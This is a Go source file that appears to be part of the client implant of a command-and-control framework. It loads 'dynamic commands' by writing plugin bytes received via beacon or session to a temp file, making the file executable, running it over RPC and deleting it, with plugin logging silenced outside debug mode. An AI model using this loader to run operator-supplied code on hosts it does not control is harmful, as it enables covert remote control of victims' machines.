package rpc_client

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"sync"

	"src/Client/dynamic/shared"
	"src/Client/generic/commands"
	"src/Client/generic/logger"
	"src/Client/generic/config"

	"github.com/hashicorp/go-plugin"
	hclog "github.com/hashicorp/go-hclog"
)

// In-memory store for dynamic commands and their clients
type DynamicCommand struct {
	Client shared.Command
}

var dynamicCommands = make(map[string]DynamicCommand)
var dynamicCommandsMutex sync.RWMutex

// builtInCommands now holds instances of your new commands.BuiltInCommand interface
var builtInCommands = make(map[string]commands.BuiltInCommand)

// builtInAdapter wraps a commands.BuiltInCommand to satisfy shared.Command for in-memory use.
type builtInAdapter struct {
	impl commands.BuiltInCommand
}

func (b *builtInAdapter) Execute(args []string) (string, error) {
	return b.impl.Execute(args)
}

func (b *builtInAdapter) ExecuteFromSession(args []string) (string, error) {
	return b.impl.ExecuteFromSession(args)
}

func (b *builtInAdapter) ExecuteFromBeacon(args []string, data string) (string, error) {
	return b.impl.ExecuteFromBeacon(args, data)
}

func RegisterBuiltInCommand(name string, cmd commands.BuiltInCommand) {
	builtInCommands[name] = cmd
}

// LoadDynamicCommandFromBeaconData writes plugin bytes to a temporary file and loads it
func LoadDynamicCommandFromBeacon(cmdName string, data []byte) error {
	tmp, err := os.CreateTemp("", cmdName+"-*.so")
	if err != nil {
		return fmt.Errorf("failed to create temp file for plugin %s: %w", cmdName, err)
	}
	defer os.Remove(tmp.Name())
	if _, err := tmp.Write(data); err != nil {
		tmp.Close()
		return fmt.Errorf("failed to write plugin data for %s: %w", cmdName, err)
	}
	tmp.Close()
	// Make the plugin file executable
	if err := os.Chmod(tmp.Name(), 0700); err != nil {
		return fmt.Errorf("failed to set execute permission for plugin %s: %w", cmdName, err)
	}
	return LoadDynamicCommand(cmdName, tmp.Name())
}

// LoadDynamicCommandFromSessionData writes plugin bytes to a temporary file and loads it
func LoadDynamicCommandFromSession(cmdName string, data []byte) error {
	return LoadDynamicCommandFromBeacon(cmdName, data)
}

func LoadDynamicCommand(cmdName string, pluginPath string) error {
	logger.Log(fmt.Sprintf("Loading dynamic command: %s from path: %s", cmdName, pluginPath))
	if pluginPath == "" {
		if cmd, ok := builtInCommands[cmdName]; ok {
			dynamicCommandsMutex.Lock()
			dynamicCommands[cmdName] = DynamicCommand{Client: &builtInAdapter{impl: cmd}}
			logger.Log(fmt.Sprintf("Registered built-in command: '%s'", cmdName))
			dynamicCommandsMutex.Unlock()
			logger.Log(fmt.Sprintf("Registered built-in command in memory: '%s'", cmdName))
			return nil
		}
		return fmt.Errorf("no plugin path specified and no built-in command '%s' found", cmdName)
	}
	logger.Log(fmt.Sprintf("Loading dynamic command from plugin path: %s", pluginPath))
	shared.RegisterPlugin(cmdName, &shared.CommandPlugin{})
	// Configure the go-plugin logger: be noisy in debug, silent otherwise
	var plog hclog.Logger
	if config.IsDebug() {
		plog = hclog.New(&hclog.LoggerOptions{
			Name:   "plugin.host",
			Level:  hclog.Debug,
		})
	} else {
		plog = hclog.New(&hclog.LoggerOptions{
			Name:   "plugin.host",
			Level:  hclog.Off,
			Output: io.Discard,
		})
	}

	client := plugin.NewClient(&plugin.ClientConfig{
		HandshakeConfig:  shared.HandshakeConfig,
		Plugins:          shared.PluginMap,
		Cmd:              exec.Command(pluginPath),
		AllowedProtocols: []plugin.Protocol{plugin.ProtocolNetRPC},
		Logger:           plog,
	})

	// Connect via RPC
	rpcClient, err := client.Client()
	if err != nil {
		client.Kill() // Ensure the plugin process is terminated
		return fmt.Errorf("failed to create RPC client for %s: %w", cmdName, err)
	}

	// Request the plugin's interface
	logger.Log(fmt.Sprintf("Requesting plugin interface for %s", cmdName))
	raw, err := rpcClient.Dispense(cmdName)
	if err != nil {
		client.Kill()
		return fmt.Errorf("failed to dispense plugin for %s: %w", cmdName, err)
	}

	cmd, ok := raw.(shared.Command)
	if !ok {
		client.Kill()
		return fmt.Errorf("plugin %s does not implement shared.Command interface", cmdName)
	}

	dynamicCommandsMutex.Lock()
	dynamicCommands[cmdName] = DynamicCommand{Client: cmd} // Store the client
	dynamicCommandsMutex.Unlock()

	fmt.Printf("Successfully loaded dynamic command: '%s'\n", cmdName)

	// Dynamically register the plugin after loading it
	logger.Log(fmt.Sprintf("Registering plugin: %s", cmdName))
	shared.RegisterPlugin(cmdName, &shared.CommandPlugin{})

	return nil
}

// ExecuteFromBeacon executes a loaded dynamic command in beacon context using the RPC client.
func ExecuteFromBeacon(cmdName string, args []string, data string) (string, error) {
	dynamicCommandsMutex.RLock()
	dc, ok := dynamicCommands[cmdName]
	dynamicCommandsMutex.RUnlock()
	if !ok {
		return "", fmt.Errorf("dynamic command '%s' not loaded", cmdName)
	}
	return dc.Client.ExecuteFromBeacon(args, data)
}

// ExecuteFromSession executes a loaded dynamic command in session context using the RPC client.
func ExecuteFromSession(cmdName string, args []string) (string, error) {
	dynamicCommandsMutex.RLock()
	dc, ok := dynamicCommands[cmdName]
	dynamicCommandsMutex.RUnlock()
	if !ok {
		return "", fmt.Errorf("dynamic command '%s' not loaded", cmdName)
	}
	return dc.Client.ExecuteFromSession(args)
}

// HasCommand checks if a dynamic command is loaded.
func HasCommand(cmdName string) bool {
	dynamicCommandsMutex.RLock()
	defer dynamicCommandsMutex.RUnlock()
	_, ok := dynamicCommands[cmdName]
	return ok
}

// ListDynamicCommands returns the names of loaded dynamic commands.
func ListDynamicCommands() []string {
	dynamicCommandsMutex.RLock()
	defer dynamicCommandsMutex.RUnlock()
	list := make([]string, 0, len(dynamicCommands))
	for name := range dynamicCommands {
		list = append(list, name)
	}
	return list
}
